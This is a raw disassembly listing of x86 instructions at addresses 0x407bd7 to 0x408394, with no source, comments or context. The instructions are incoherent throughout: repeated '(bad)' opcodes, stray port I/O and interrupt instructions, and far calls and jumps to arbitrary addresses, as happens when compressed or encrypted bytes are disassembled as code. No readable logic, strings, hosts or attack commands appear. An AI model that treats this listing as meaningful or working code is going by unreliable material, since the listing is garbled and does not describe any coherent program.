  407bd7:	mov    ch,0xa7
  407bd9:	cmp    BYTE PTR [edi+0x14],0x99
  407bdd:	mov    ah,ch
  407bdf:	inc    esi
  407be0:	inc    edx
  407be1:	clc    
  407be2:	pop    edi
  407be3:	xchg   ecx,eax
  407be4:	jmp    0x407b7c
  407be6:	mov    WORD PTR [edx],ss
  407be8:	jl     0x407b7a
  407bea:	jne    0x407c1e
  407bec:	fs ins DWORD PTR es:[edi],dx
  407bee:	mov    ah,0x36
  407bf0:	cmp    eax,0x930ce1a
  407bf5:	adc    esp,DWORD PTR [ecx]
  407bf7:	out    0xb1,al
  407bf9:	(bad)  
  407bfa:	cmp    DWORD PTR [edx],ebp
  407bfc:	mov    al,ds:0x78c9f41e
  407c01:	ss cs pop edx
  407c04:	mov    ebp,DWORD PTR [ebx]
  407c06:	push   0x70106af7
  407c0b:	std    
  407c0c:	jbe    0x407c19
  407c0e:	js     0x407c06
  407c10:	dec    eax
  407c11:	fcomp  DWORD PTR [ecx]
  407c13:	and    ebp,DWORD PTR [eax+0xb]
  407c16:	daa    
  407c17:	mov    dh,0x15
  407c19:	mov    edi,0x2534d62f
  407c1e:	mov    ch,0x84
  407c20:	test   DWORD PTR [ebp+eax*2-0x3b],ecx
  407c24:	scas   al,BYTE PTR es:[edi]
  407c25:	mov    esp,0x43cc0cfc
  407c2a:	sbb    BYTE PTR [esi],ah
  407c2c:	xchg   ebx,eax
  407c2d:	mov    al,0xd0
  407c2f:	cmp    BYTE PTR [esi+0x40887101],bl
  407c35:	loopne 0x407c6e
  407c37:	into   
  407c38:	mov    bl,0x7a
  407c3a:	add    eax,0xd54f89be
  407c3f:	out    0x6f,al
  407c41:	sub    BYTE PTR [ecx],cl
  407c43:	mov    ss,WORD PTR [eax+0x1d]
  407c46:	mov    dl,0x56
  407c48:	rcl    BYTE PTR [eax-0x5659b204],cl
  407c4e:	loop   0x407ca0
  407c50:	fcom   QWORD PTR [esi-0x26]
  407c53:	es jae 0x407ccc
  407c56:	and    al,0xff
  407c58:	push   esi
  407c59:	jo     0x407bf7
  407c5b:	fistp  QWORD PTR [edx]
  407c5d:	or     al,0x3
  407c5f:	add    BYTE PTR [edx-0x772b8c47],ah
  407c65:	jbe    0x407c6e
  407c67:	in     eax,0xd5
  407c69:	mov    bl,0xa1
  407c6b:	jp     0x407c8d
  407c6d:	(bad)  
  407c6e:	xchg   ecx,eax
  407c6f:	popf   
  407c70:	popf   
  407c71:	aaa    
  407c72:	sub    esp,DWORD PTR [ebp+ebx*1+0x3f55ee54]
  407c79:	dec    edx
  407c7a:	mov    bl,0x71
  407c7c:	push   eax
  407c7d:	push   esp
  407c7e:	xchg   ebp,eax
  407c7f:	xchg   esp,eax
  407c80:	ss xchg edx,eax
  407c82:	mov    dl,0x19
  407c84:	(bad)  
  407c85:	lods   eax,DWORD PTR ds:[esi]
  407c86:	(bad)  
  407c87:	popf   
  407c88:	cmp    ah,BYTE PTR [eax-0x23832bf4]
  407c8e:	sbb    eax,0x419bf9ca
  407c93:	ror    DWORD PTR [eax],cl
  407c95:	pop    es
  407c96:	inc    edi
  407c97:	xchg   edi,eax
  407c98:	xor    ebp,ecx
  407c9a:	xchg   edx,eax
  407c9b:	xchg   ecx,eax
  407c9c:	or     BYTE PTR [eax-0x75ddd6cf],dh
  407ca2:	lods   al,BYTE PTR ds:[esi]
  407ca3:	je     0x407c3f
  407ca5:	push   cs
  407ca6:	cmp    al,0xd7
  407ca8:	cmp    DWORD PTR [ecx],ecx
  407caa:	dec    esp
  407cab:	(bad)
  407cae:	sbb    al,0xe3
  407cb0:	es cmc 
  407cb2:	xchg   DWORD PTR [esi-0x4f5382b3],ebx
  407cb8:	in     al,dx
  407cb9:	or     al,0x57
  407cbb:	lods   al,BYTE PTR ds:[esi]
  407cbc:	fnstcw WORD PTR [edx+0x4fb9ccfb]
  407cc2:	call   0x89526349
  407cc7:	sub    BYTE PTR [ebx-0x262ec83f],dh
  407ccd:	stos   DWORD PTR es:[edi],eax
  407cce:	inc    esi
  407ccf:	in     eax,0x9e
  407cd1:	jecxz  0x407d34
  407cd3:	sbb    DWORD PTR [eax+esi*1-0x22],edi
  407cd7:	xchg   ebx,eax
  407cd8:	push   edx
  407cd9:	iret   
  407cda:	push   ebp
  407cdb:	sbb    DWORD PTR [esi+0x23],eax
  407cde:	repz or edx,DWORD PTR [edi-0x33e4f2b8]
  407ce5:	(bad)  
  407ce6:	scas   al,BYTE PTR es:[edi]
  407ce7:	sbb    BYTE PTR [esi-0x35a15ed1],dh
  407ced:	(bad)  
  407cee:	mov    esp,0x36647da4
  407cf3:	xchg   ebx,eax
  407cf4:	xor    eax,DWORD PTR [ebp+0x3820209c]
  407cfa:	add    bl,ch
  407cfc:	mov    ah,0x42
  407cfe:	push   ebp
  407cff:	and    cl,ah
  407d01:	inc    ebp
  407d02:	mov    ds:0x379541d1,al
  407d07:	clc    
  407d08:	jnp    0x407ce9
  407d0a:	scas   eax,DWORD PTR es:[edi]
  407d0b:	mov    ecx,0xdd6ba9d6
  407d10:	jmp    0x407c92
  407d12:	aas    
  407d13:	stos   DWORD PTR es:[edi],eax
  407d14:	stos   BYTE PTR es:[edi],al
  407d15:	sar    DWORD PTR [edi],cl
  407d17:	mov    BYTE PTR [edx],cl
  407d19:	sub    al,0x1b
  407d1b:	cld    
  407d1c:	aam    0xdf
  407d1e:	cmp    ebp,DWORD PTR [ebx]
  407d20:	cmc    
  407d21:	mov    edx,0x58287dc5
  407d26:	jno    0x407d09
  407d28:	retf   0x4bf8
  407d2b:	int    0x31
  407d2d:	adc    ebp,DWORD PTR [eax]
  407d2f:	and    cl,ch
  407d31:	inc    esi
  407d32:	xor    esp,DWORD PTR [eax-0x471817b2]
  407d38:	test   al,dh
  407d3a:	in     al,0x66
  407d3c:	fidivr WORD PTR [edx+0x44]
  407d3f:	stos   DWORD PTR es:[edi],eax
  407d40:	xor    ecx,DWORD PTR [ecx]
  407d42:	(bad)  
  407d44:	dec    edx
  407d45:	dec    esp
  407d46:	inc    BYTE PTR [ebp+0x2b]
  407d49:	add    eax,0x6de9f92e
  407d4e:	dec    esp
  407d4f:	les    edi,FWORD PTR [ebx+0x7be174a9]
  407d55:	inc    esi
  407d56:	mov    bl,0xcf
  407d58:	call   0xe37d:0xe88c3617
  407d5f:	(bad)  
  407d60:	cld    
  407d61:	jae    0x407dd5
  407d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d64:	pusha  
  407d65:	shr    DWORD PTR [esi],0x2a
  407d68:	(bad)  
  407d69:	stc    
  407d6a:	and    esi,edi
  407d6c:	ins    BYTE PTR es:[edi],dx
  407d6d:	or     al,0x36
  407d6f:	test   DWORD PTR [ebp-0x64],0x3dabe9d4
  407d76:	push   ds
  407d77:	pusha  
  407d78:	(bad)  
  407d79:	in     al,0x4d
  407d7b:	push   es
  407d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d7d:	jmp    0x407d2f
  407d7f:	mov    bh,0x3d
  407d81:	pop    ebx
  407d82:	xor    al,BYTE PTR [edi+0x3d]
  407d85:	mov    DWORD PTR [ebx+esi*1-0x41adfd9],eax
  407d8c:	loop   0x407dd8
  407d8e:	mov    WORD PTR [edx-0x4c],cs
  407d91:	sub    eax,DWORD PTR [edx]
  407d93:	js     0x407d1b
  407d95:	push   cs
  407d96:	fwait
  407d97:	jge    0x407d4e
  407d99:	std    
  407d9a:	and    al,0x6
  407d9c:	loope  0x407d46
  407d9e:	mov    eax,ds:0x508ef599
  407da3:	push   esp
  407da4:	repnz push esi
  407da6:	sbb    ecx,esi
  407da8:	sub    al,BYTE PTR [eax-0x9ca5f99]
  407dae:	adc    BYTE PTR [esi-0x1e],dh
  407db1:	popa   
  407db2:	add    DWORD PTR [edx-0x5904c93a],edx
  407db8:	test   eax,0x96e996cc
  407dbd:	jle    0x407da1
  407dbf:	repz push edi
  407dc1:	sti    
  407dc2:	cmc    
  407dc3:	mov    eax,ds:0xb1678830
  407dc8:	push   0x8a658462
  407dcd:	arpl   WORD PTR [eax],si
  407dcf:	adc    eax,0x311ed9d
  407dd4:	je     0x407e0b
  407dd6:	sub    ch,ch
  407dd8:	les    esi,FWORD PTR [ecx-0x37848009]
  407dde:	jbe    0x407e1e
  407de0:	in     al,0xb9
  407de2:	(bad)  
  407de4:	cmp    ebx,DWORD PTR [eax+0x1ab8cd3d]
  407dea:	sub    al,0x9b
  407dec:	mov    ebp,0xf90d857b
  407df1:	call   0xe168:0x7dc4db3a
  407df8:	jo     0x407e10
  407dfa:	fucomp st(4)
  407dfc:	mov    al,ds:0xee264d49
  407e01:	gs sahf 
  407e03:	push   esp
  407e04:	mov    dh,0x4
  407e06:	mov    ds:0x9f01841,al
  407e0b:	dec    edx
  407e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e0d:	or     al,0x25
  407e0f:	es mov eax,0x9edc1780
  407e15:	push   eax
  407e16:	cmp    BYTE PTR [ebx],0xd0
  407e19:	scas   eax,DWORD PTR es:[edi]
  407e1a:	(bad)  
  407e1c:	mov    bl,0x99
  407e1e:	dec    eax
  407e1f:	jne    0x407e9d
  407e21:	push   edi
  407e22:	push   ss
  407e23:	or     BYTE PTR [eax],0x6c
  407e26:	xor    BYTE PTR [esi+0x79990662],bh
  407e2c:	mov    ebp,0xb9ec3d9f
  407e31:	push   ds
  407e32:	and    dl,BYTE PTR [ebp+0x635f028a]
  407e38:	and    BYTE PTR [edi],0x6c
  407e3b:	mov    bl,0x96
  407e3d:	div    DWORD PTR [eax+0x4a2deb70]
  407e43:	out    dx,eax
  407e44:	(bad)  
  407e45:	ret    
  407e46:	and    ah,BYTE PTR [ecx]
  407e48:	fdiv   QWORD PTR ds:0x600575b5
  407e4e:	or     cl,BYTE PTR [edx-0x4cc1ea76]
  407e54:	xchg   BYTE PTR [edi-0x6a],ah
  407e57:	push   esp
  407e58:	ds scas eax,DWORD PTR es:[edi]
  407e5a:	arpl   WORD PTR [esi-0x75],bp
  407e5d:	add    BYTE PTR [ebx],dl
  407e5f:	sub    eax,0x2db3ce9e
  407e64:	das    
  407e65:	int    0x9f
  407e67:	sbb    esp,DWORD PTR [ecx+0x18e6bd32]
  407e6d:	or     al,0x45
  407e6f:	sti    
  407e70:	jnp    0x407e15
  407e72:	sbb    DWORD PTR [ecx-0x122c226e],edi
  407e78:	mov    BYTE PTR [ebx-0x37],dh
  407e7b:	cmp    bh,BYTE PTR [esi]
  407e7d:	add    al,0xb0
  407e7f:	stc    
  407e80:	jbe    0x407ed1
  407e82:	test   BYTE PTR [edi],dh
  407e84:	mov    eax,0x96b6e6e7
  407e89:	aaa    
  407e8a:	pop    eax
  407e8b:	stos   BYTE PTR es:[edi],al
  407e8c:	push   ss
  407e8d:	call   0x2de5fe7
  407e92:	dec    ebp
  407e93:	ins    BYTE PTR es:[edi],dx
  407e94:	or     eax,0xc67adb23
  407e99:	xor    dh,dh
  407e9b:	sbb    dl,BYTE PTR [ecx+0x54]
  407e9e:	pop    DWORD PTR [edx+edi*1+0x28024d9b]
  407ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ea6:	(bad)  
  407ea7:	fist   DWORD PTR [ecx+0x4a]
  407eaa:	push   eax
  407eab:	xor    DWORD PTR [edi+ebx*1-0x4a3b2eb9],edx
  407eb2:	imul   esi,DWORD PTR ds:0x73670127,0xffffffb3
  407eb9:	pushf  
  407eba:	jmp    0xe407c0a6
  407ebf:	jmp    0xcb03e26c
  407ec4:	mov    DWORD PTR [esp+ecx*1+0x33],edi
  407ec8:	call   0x76eba56e
  407ecd:	test   BYTE PTR [edx+0xe6034b2],bl
  407ed3:	call   0x1444:0x82006653
  407eda:	xor    ebp,eax
  407edc:	mov    eax,0x220b92d6
  407ee1:	lods   al,BYTE PTR ds:[esi]
  407ee2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  407ee4:	and    BYTE PTR [esi-0x39],al
  407ee7:	icebp  
  407ee8:	or     al,0x17
  407eea:	ins    DWORD PTR es:[edi],dx
  407eeb:	ins    DWORD PTR es:[edi],dx
  407eec:	out    dx,al
  407eed:	cli    
  407eee:	jg     0x407ef4
  407ef0:	or     BYTE PTR [ecx-0x23],bh
  407ef3:	jne    0x407efa
  407ef5:	ret    
  407ef6:	in     al,dx
  407ef7:	mov    eax,ds:0xcf1d814d
  407efc:	add    eax,0xf69cd425
  407f01:	mov    eax,ds:0xc36f2b6e
  407f06:	xchg   ebx,eax
  407f07:	dec    ebx
  407f08:	sbb    edx,DWORD PTR [edi+0x7308f151]
  407f0e:	add    al,0x98
  407f10:	or     al,0xe6
  407f12:	call   0xb7e4da12
  407f17:	fidivr DWORD PTR [edi+0x24c1e3b0]
  407f1d:	mov    edx,0x897d8369
  407f22:	jl     0x407ee0
  407f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f25:	pushw  ds
  407f27:	adc    bh,BYTE PTR [eax-0x8]
  407f2a:	adc    al,0x73
  407f2c:	punpckhdq mm2,QWORD PTR ss:[ecx+0x6a0f76bb]
  407f34:	jecxz  0x407f4f
  407f36:	push   ds
  407f37:	push   edx
  407f38:	ror    BYTE PTR [edx+edx*4-0x46b61932],0x11
  407f40:	rcr    BYTE PTR [edx],1
  407f42:	dec    ecx
  407f43:	push   0x61
  407f45:	retf   
  407f46:	mov    bh,0x25
  407f48:	ins    DWORD PTR es:[edi],dx
  407f49:	bnd ja 0x407fbd
  407f4c:	aad    0xa8
  407f4e:	jns    0x407ef6
  407f50:	jnp    0x407ed4
  407f52:	jp     0x407fc7
  407f54:	jl     0x407f98
  407f56:	sub    dl,dl
  407f58:	aaa    
  407f59:	int3   
  407f5a:	and    al,0xa
  407f5c:	ret    0xdab6
  407f5f:	aas    
  407f60:	xchg   DWORD PTR [esi+0x33],ebx
  407f63:	lods   eax,DWORD PTR ds:[esi]
  407f64:	adc    BYTE PTR ds:0x77435bef,dl
  407f6a:	cs imul ecx,ecx,0xc5273c63
  407f71:	adc    DWORD PTR [edx-0x57],ebp
  407f74:	xchg   esi,eax
  407f75:	icebp  
  407f76:	xor    DWORD PTR [ecx+ebp*8-0x38764eb0],esp
  407f7d:	mov    ecx,0xcd5c8c6f
  407f82:	xor    eax,0xcc6e9306
  407f87:	in     al,0x7a
  407f89:	pusha  
  407f8a:	cmp    ch,cl
  407f8c:	stos   BYTE PTR es:[edi],al
  407f8d:	out    0xaa,eax
  407f8f:	or     ch,0x33
  407f92:	and    BYTE PTR [ebp+0x18],bl
  407f95:	hlt    
  407f96:	fcom   QWORD PTR [ecx+0x679058d1]
  407f9c:	and    BYTE PTR [ebx+0x49],bh
  407f9f:	xlat   BYTE PTR ds:[ebx]
  407fa0:	adc    al,BYTE PTR [edx]
  407fa2:	pop    esi
  407fa3:	lahf   
  407fa4:	enter  0x82dc,0x1d
  407fa8:	dec    ecx
  407fa9:	test   ebx,edi
  407fab:	adc    al,BYTE PTR [eax+edx*2-0x72]
  407faf:	aad    0xc1
  407fb1:	jecxz  0x40800b
  407fb3:	add    al,bh
  407fb5:	jmp    0x408021
  407fb7:	fnstenv [edi-0xf33813c]
  407fbd:	mov    dl,ah
  407fbf:	(bad)  
  407fc0:	repz xor ah,al
  407fc3:	fsubr  QWORD PTR [esi+0x7a3f66b6]
  407fc9:	(bad)  
  407fca:	stos   DWORD PTR es:[edi],eax
  407fcb:	cs fucom st(0)
  407fce:	int    0x63
  407fd0:	outs   dx,DWORD PTR ds:[esi]
  407fd1:	xchg   ebp,eax
  407fd2:	sbb    BYTE PTR [edx-0x1f],cl
  407fd5:	jns    0x407ff9
  407fd7:	dec    ecx
  407fd8:	push   ebx
  407fd9:	dec    ebx
  407fda:	sbb    esp,edi
  407fdc:	ror    ah,0xff
  407fdf:	or     dl,BYTE PTR [esi+0x7a69b78c]
  407fe5:	inc    ebp
  407fe6:	pop    edi
  407fe7:	inc    ebp
  407fe8:	mov    ds:0x4e829976,eax
  407fed:	sbb    eax,0xca648ee9
  407ff2:	add    al,0x7d
  407ff4:	pop    es
  407ff5:	push   ebp
  407ff6:	xchg   ecx,eax
  407ff7:	js     0x40803a
  407ff9:	in     al,dx
  407ffa:	imul   esi,ebp,0x14
  407ffd:	adc    al,0x60
  407fff:	pop    ds
  408000:	out    dx,al
  408001:	push   esi
  408002:	push   ebp
  408003:	pop    ecx
  408004:	mov    ah,bl
  408006:	pop    edi
  408007:	fild   QWORD PTR [ebx]
  408009:	loopne 0x407fdd
  40800b:	call   0x992cf361
  408010:	adc    BYTE PTR [ebx+0x7701c503],0x4e
  408017:	xchg   BYTE PTR [ecx+ebx*4+0x1d],dl
  40801b:	jle    0x407fbf
  40801d:	add    eax,0x108f2be8
  408022:	repz push es
  408024:	stc    
  408025:	into   
  408026:	xor    eax,0xc05243de
  40802b:	add    DWORD PTR [ebp-0x68],ecx
  40802e:	jmp    0x968d:0x4ce73ec9
  408035:	xor    ah,BYTE PTR [ebx+esi*1+0xf]
  408039:	es sub dh,ah
  40803c:	xchg   DWORD PTR [ebx-0x32],edi
  40803f:	jbe    0x408007
  408041:	sbb    al,0x14
  408043:	sub    cl,BYTE PTR ds:0xe1149bda
  408049:	push   cs
  40804a:	ret    0x5ab8
  40804d:	stos   BYTE PTR es:[edi],al
  40804e:	inc    esi
  40804f:	xchg   BYTE PTR [eax],ch
  408051:	xchg   ecx,eax
  408052:	ins    BYTE PTR es:[edi],dx
  408053:	cmp    ecx,DWORD PTR [ecx-0x6d]
  408056:	mov    ch,0x89
  408058:	fmul   QWORD PTR [ebx+0x24551cf8]
  40805e:	xor    ecx,eax
  408060:	xor    DWORD PTR [esi-0x60],edi
  408063:	jl     0x4080b0
  408065:	add    edi,DWORD PTR [esi-0x70]
  408068:	mov    BYTE PTR ds:0x1b6d4843,ch
  40806e:	jns    0x407ffb
  408070:	cmp    eax,0xcdf161d9
  408075:	(bad)  
  408076:	push   ebp
  408077:	add    ebp,ebp
  408079:	or     eax,0x96a94e99
  40807e:	mov    ds:0x3a607449,al
  408083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408084:	add    eax,0x5c902535
  408089:	(bad)  
  40808a:	jmp    0xdf9e:0x61190d47
  408091:	lahf   
  408092:	loopne 0x40804b
  408094:	fs out dx,eax
  408096:	or     DWORD PTR [eax-0x70],ecx
  408099:	(bad)  
  40809a:	adc    DWORD PTR [esi],esi
  40809c:	daa    
  40809d:	fst    QWORD PTR [edx+0x1eeb6778]
  4080a3:	outs   dx,BYTE PTR ds:[esi]
  4080a4:	or     al,0x2c
  4080a6:	mov    WORD PTR [ebx+0x79d42fe8],?
  4080ac:	pop    ecx
  4080ad:	xchg   cl,bl
  4080af:	mov    ds:0xa627d6d3,eax
  4080b4:	dec    ebx
  4080b5:	lds    ecx,FWORD PTR [ecx+edx*1]
  4080b8:	ret    
  4080b9:	ret    
  4080ba:	aam    0x83
  4080bc:	pop    DWORD PTR [eax+0x17865525]
  4080c2:	aaa    
  4080c3:	scas   eax,DWORD PTR es:[edi]
  4080c4:	and    al,0xe2
  4080c7:	jno    0x4080d8
  4080c9:	mov    eax,ds:0x752d33ee
  4080ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080cf:	cmp    al,0xcf
  4080d1:	push   ebx
  4080d2:	aaa    
  4080d3:	jae    0x408133
  4080d5:	js     0x408149
  4080d7:	popa   
  4080d8:	inc    eax
  4080d9:	leave  
  4080da:	or     ah,al
  4080dc:	rol    DWORD PTR [ebp+0x772166b5],cl
  4080e2:	(bad)  
  4080e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e4:	shr    edi,0xee
  4080e7:	pop    edi
  4080e8:	out    0x17,eax
  4080ea:	xchg   edi,eax
  4080eb:	cmp    al,BYTE PTR [ecx-0x55]
  4080ee:	push   ss
  4080ef:	push   ebx
  4080f0:	mov    BYTE PTR [esi*1+0x228ba1d5],dh
  4080f7:	push   eax
  4080f8:	(bad)  [ebx+0x3c]
  4080fb:	(bad)  
  4080fc:	rol    ch,cl
  4080fe:	sar    cl,1
  408100:	data16 jns 0x4080db
  408103:	pop    eax
  408104:	mov    dh,0x70
  408106:	inc    BYTE PTR [eax+0x2a6566a7]
  40810c:	inc    ebp
  40810d:	mov    al,0xfc
  40810f:	adc    DWORD PTR [eax],ebx
  408111:	sbb    BYTE PTR [eax+0x6d5020f7],dl
  408117:	jno    0x408188
  408119:	mov    BYTE PTR [edx],bl
  40811b:	inc    esi
  40811c:	pop    ebp
  40811d:	or     al,BYTE PTR [ecx]
  40811f:	cwde   
  408120:	retf   
  408121:	mov    ds:0xd54c9826,al
  408126:	pop    edx
  408127:	mov    esp,0x1d4c151c
  40812c:	inc    edx
  40812d:	mov    bl,0x22
  40812f:	out    dx,eax
  408130:	push   es
  408131:	call   0x5247008b
  408136:	xchg   edi,eax
  408137:	std    
  408138:	popa   
  408139:	shl    BYTE PTR [edi+edi*4],0x8f
  40813d:	aas    
  40813e:	jmp    0xea0b187e
  408143:	pop    es
  408144:	les    ebp,FWORD PTR [edi+0x18740b88]
  40814a:	ret    0x3914
  40814d:	push   esp
  40814e:	jl     0x4081ad
  408150:	mov    dl,0x69
  408152:	jno    0x4080dc
  408154:	mul    ebx
  408156:	push   edx
  408157:	xchg   ebp,eax
  408158:	xchg   ebp,eax
  408159:	shl    BYTE PTR [esi+0x6a],1
  40815c:	out    dx,al
  40815d:	push   0x64f7e544
  408162:	mov    ds:0x47381b63,eax
  408167:	jns    0x408153
  408169:	jl     0x4080ec
  40816b:	ret    0xe6a6
  40816e:	add    ecx,esi
  408170:	loop   0x4081ed
  408172:	pop    edx
  408173:	(bad)  
  408174:	jae    0x408194
  408176:	xchg   ebx,eax
  408177:	pusha  
  408178:	inc    esi
  408179:	int3   
  40817a:	pushf  
  40817b:	call   0x6e9dae0b
  408180:	das    
  408181:	test   DWORD PTR [ebx+0x72],ecx
  408184:	pop    ecx
  408185:	inc    edi
  408186:	loopne 0x408141
  408188:	es and bl,0x21
  40818c:	pop    edi
  40818d:	mov    ebx,0x377de418
  408192:	jae    0x408120
  408194:	xchg   esi,eax
  408195:	in     al,0xa6
  408197:	cmp    edx,DWORD PTR [edx-0x550b7f1f]
  40819d:	push   es
  40819e:	mov    edi,0xc8ebea89
  4081a3:	call   0x8c028a0a
  4081a8:	fistp  DWORD PTR [edx+0x2c]
  4081ab:	retf   
  4081ac:	pop    esp
  4081ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081ae:	xchg   esi,eax
  4081af:	mov    ecx,0x7253dab
  4081b4:	aad    0xf0
  4081b6:	push   eax
  4081b7:	nop
  4081b8:	sbb    BYTE PTR [esi-0x3bb2074f],cl
  4081be:	mov    esp,0x8084bf8a
  4081c3:	imul   edi,DWORD PTR [esi+0x1bcce312],0x56
  4081ca:	scas   eax,DWORD PTR es:[edi]
  4081cb:	(bad)  
  4081cc:	or     eax,0x6fabdafe
  4081d1:	jge    0x4081da
  4081d3:	out    0x6b,al
  4081d5:	push   ebp
  4081d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081d7:	xor    eax,0x44eea7b6
  4081dc:	push   esi
  4081dd:	shl    BYTE PTR [eax+eax*4+0x241176e1],cl
  4081e4:	jno    0x408201
  4081e6:	aas    
  4081e7:	and    BYTE PTR [ebp-0x17d99de3],0x21
  4081ee:	retf   
  4081ef:	iret   
  4081f0:	rcr    DWORD PTR [ebx],1
  4081f2:	imul   edx,DWORD PTR [ebx+0x35e573d],0xf2253b36
  4081fc:	sub    ebp,DWORD PTR [edi+esi*4+0x7652f5f9]
  408203:	sub    al,0x31
  408205:	cwde   
  408206:	iret   
  408207:	xchg   ecx,eax
  408208:	add    DWORD PTR [esi-0x38e99e6],ebp
  40820e:	jl     0x4081d2
  408210:	cmp    al,0x3c
  408212:	mov    WORD PTR [esi-0x5627a9c2],?
  408218:	not    al
  40821a:	xchg   DWORD PTR [ebx+0x25],eax
  40821d:	push   cs
  40821e:	fs adc bl,dh
  408221:	out    dx,eax
  408222:	and    ebx,DWORD PTR [bp+di]
  408225:	sbb    esi,0x86a75e61
  40822b:	ins    DWORD PTR es:[edi],dx
  40822c:	retf   0xdbde
  40822f:	retf   
  408230:	mov    edx,DWORD PTR [ecx]
  408232:	jp     0x408235
  408234:	jp     0x4081b6
  408236:	pop    ebx
  408237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408238:	(bad)  
  408239:	lock test al,0x47
  40823c:	test   eax,0x51bd712d
  408241:	cmp    al,0x9c
  408243:	cmp    eax,0x7f26d7ac
  408248:	jnp    0x40820e
  40824a:	aas    
  40824b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40824c:	lods   al,BYTE PTR ds:[esi]
  40824d:	neg    al
  40824f:	loop   0x40825c
  408251:	pop    ds
  408252:	repz xchg esi,eax
  408254:	je     0x408254
  408256:	sub    al,0xba
  408258:	outs   dx,BYTE PTR ds:[esi]
  408259:	push   ebx
  40825a:	adc    esi,DWORD PTR [ecx]
  40825c:	data16 repnz mov dh,0xbe
  408260:	ss call 0xcf9b:0x9f69d526
  408268:	fidiv  DWORD PTR [eax+0x22af1308]
  40826e:	cmp    bh,0x93
  408271:	sbb    DWORD PTR [edx+ebx*2-0x10],0xffffffc1
  408276:	(bad)  
  408277:	push   0xffffffb5
  408279:	stc    
  40827a:	mov    edx,DWORD PTR [esi+0x381cccf1]
  408280:	stos   DWORD PTR es:[edi],eax
  408281:	scas   eax,DWORD PTR es:[edi]
  408282:	repz mov ch,0x6a
  408285:	ficomp DWORD PTR [edx-0x38]
  408288:	(bad)  
  408289:	ss mov al,0xd
  40828c:	inc    edi
  40828d:	adc    DWORD PTR [edx],esp
  40828f:	loopne 0x40822f
  408291:	or     BYTE PTR ds:0x638141b0,cl
  408297:	mov    ah,0xc7
  408299:	scas   al,BYTE PTR es:[edi]
  40829a:	test   BYTE PTR [ecx-0x59],ah
  40829d:	xor    al,0x92
  40829f:	adc    DWORD PTR [ecx],ebx
  4082a1:	leave  
  4082a2:	jge    0x40828c
  4082a4:	out    dx,al
  4082a5:	push   0xff280723
  4082aa:	add    BYTE PTR [ebx],dh
  4082ac:	add    DWORD PTR [eax+ecx*2+0x38209332],edi
  4082b3:	lods   al,BYTE PTR ds:[esi]
  4082b4:	imul   DWORD PTR [esi-0x33]
  4082b7:	enter  0xfad8,0xf9
  4082bb:	lahf   
  4082bc:	mov    dh,0x66
  4082be:	ins    BYTE PTR es:[edi],dx
  4082bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c0:	int    0xb7
  4082c2:	and    eax,0xee668f8a
  4082c7:	inc    esp
  4082c8:	adc    al,0xf
  4082ca:	lahf   
  4082cb:	xor    al,0xd3
  4082cd:	or     BYTE PTR [esi+0xd],dl
  4082d0:	aad    0x98
  4082d2:	add    al,0x39
  4082d4:	(bad)  
  4082d5:	ror    BYTE PTR [edi+0x53],1
  4082d8:	(bad)  
  4082d9:	ja     0x408346
  4082db:	mov    DWORD PTR [esi],ebx
  4082dd:	dec    edi
  4082de:	adc    BYTE PTR [edi+edi*4+0x54],0x38
  4082e3:	mov    al,ds:0x67fa08d1
  4082e8:	retf   
  4082e9:	xchg   esp,eax
  4082ea:	inc    esp
  4082eb:	into   
  4082ec:	call   0x2214:0xcedbe4d
  4082f3:	cwde   
  4082f4:	add    esp,DWORD PTR ds:0x9d2a73f6
  4082fa:	cli    
  4082fb:	std    
  4082fc:	f2xm1  
  4082fe:	(bad)  
  408300:	mov    ebx,0x1a199217
  408305:	jne    0x4082c9
  408307:	inc    edx
  408308:	out    0x4c,eax
  40830a:	mov    ecx,0xc24f7dff
  40830f:	xlat   BYTE PTR ds:[ebx]
  408310:	mov    esi,0xfccefad0
  408315:	xchg   DWORD PTR [edx],eax
  408317:	dec    BYTE PTR [ebx-0x3b]
  40831a:	push   es
  40831b:	aam    0xe4
  40831d:	jge    0x408305
  40831f:	mov    dh,ch
  408321:	add    eax,0x734191aa
  408326:	cmp    eax,eax
  408328:	adc    DWORD PTR [edi+0x54],ebp
  40832b:	jbe    0x40833f
  40832d:	cmp    cl,ah
  40832f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408330:	ror    BYTE PTR [edi-0x7601e6b8],cl
  408336:	mov    ebp,DWORD PTR [ebx-0x7638db9d]
  40833c:	lds    esp,FWORD PTR ds:0xf5cfb242
  408342:	fimul  WORD PTR [edx+ebp*8-0x3c]
  408346:	(bad)  
  408347:	popf   
  408348:	mov    eax,ds:0x6b896bd8
  40834d:	mov    al,0x9c
  40834f:	fucom  st(6)
  408351:	fldenv [edi]
  408353:	push   es
  408354:	mov    ebx,?
  408356:	or     al,0x4e
  408358:	push   es
  408359:	push   eax
  40835a:	adc    eax,0x8c19ddf3
  40835f:	div    bl
  408361:	shl    BYTE PTR [edx],0x1b
  408364:	mov    ds:0xe37c45c7,al
  408369:	xor    dh,BYTE PTR [ebx-0x6aa08edc]
  40836f:	sahf   
  408370:	adc    ah,BYTE PTR [eax-0x11]
  408373:	push   ecx
  408374:	push   0x3cdba97c
  408379:	gs jle 0x40838c
  40837c:	sbb    eax,esi
  40837e:	pcmpgtb mm5,mm0
  408381:	std    
  408382:	xor    dl,BYTE PTR [edi+0x49]
  408385:	in     eax,dx
  408386:	push   ecx
  408387:	push   ss
  408388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408389:	dec    edx
  40838a:	fidivr WORD PTR [ecx]
  40838c:	pop    ecx
  40838d:	loopne 0x408340
  40838f:	sub    al,0x96
  408391:	repnz out 0x63,al
  408394:	jae    0x408382
